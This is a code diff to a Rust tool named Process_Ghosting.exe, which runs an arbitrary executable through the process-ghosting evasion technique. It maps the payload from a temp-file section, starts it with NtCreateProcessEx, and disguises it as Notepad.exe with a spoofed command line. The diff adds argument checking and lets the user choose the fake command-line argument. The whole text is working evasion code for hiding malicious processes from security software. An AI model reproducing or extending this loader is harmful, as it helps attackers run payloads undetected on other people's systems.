@@ -16,6 +16,11 @@ use winapi::{
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     let args: Vec<String> = args().collect();
+
+    if args.len() != 3 {
+        panic!("Usage: Process_Ghosting.exe <exe> <args>");
+    }
+
     let buffer = read(&args[1]).map_err(|e| format!("[!] Erro Read File: {e}"))?;
     let dir_temp = U16CString::from_str(std::env::temp_dir().to_str().unwrap())?;
     let prefix = U16CString::from_str("TT")?;
@@ -28,7 +33,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("[+] PATH TEMP: {}", path_nt);
 
     let h_section = create_section_file(path_nt, &buffer)?;
-    create_process(h_section, buffer)?;
+    create_process(h_section, buffer, &args[2])?;
     
     Ok(())
 }
@@ -121,7 +126,7 @@ fn create_section_file(path: String, buffer: &[u8]) -> Result<HANDLE, String> {
 ///
 /// Creating a process from the section obtained
 /// 
-fn create_process(h_section: HANDLE, buffer: Vec<u8>) -> Result<(), String> {
+fn create_process(h_section: HANDLE, buffer: Vec<u8>, args: &String) -> Result<(), String> {
     let mut h_process = null_mut();
     let mut status = unsafe {
         NtCreateProcessEx(
@@ -143,7 +148,7 @@ fn create_process(h_section: HANDLE, buffer: Vec<u8>) -> Result<(), String> {
         return Err(format!("[!] NtCreateProcessEx Failed With Status: {status}"));
     }
     
-    let base_address = init_params(h_process)?;
+    let base_address = init_params(h_process, args)?;
     let address_entrypoint = search_entrypoint(&buffer)?;
     let entry_point = ((base_address as usize) + address_entrypoint) as *mut c_void;
     let mut h_thread = null_mut();
@@ -174,8 +179,8 @@ fn create_process(h_section: HANDLE, buffer: Vec<u8>) -> Result<(), String> {
 ///
 /// Updating RTL_USER_PROCESS_PARAMETERS to start the process correctly
 /// 
-fn init_params(h_process: HANDLE) -> Result<*mut c_void, String> {
-    let command_line = U16CString::from_str("C:\\Windows\\System32\\Notepad.exe coffee").unwrap();
+fn init_params(h_process: HANDLE, args: &String) -> Result<*mut c_void, String> {
+    let command_line = U16CString::from_str(format!("C:\\Windows\\System32\\Notepad.exe {args}")).unwrap();
     let current_directory = U16CString::from_str("C:\\Windows\\System32").unwrap();
     let image_path = U16CString::from_str("C:\\Windows\\System32\\Notepad.exe").unwrap();
     
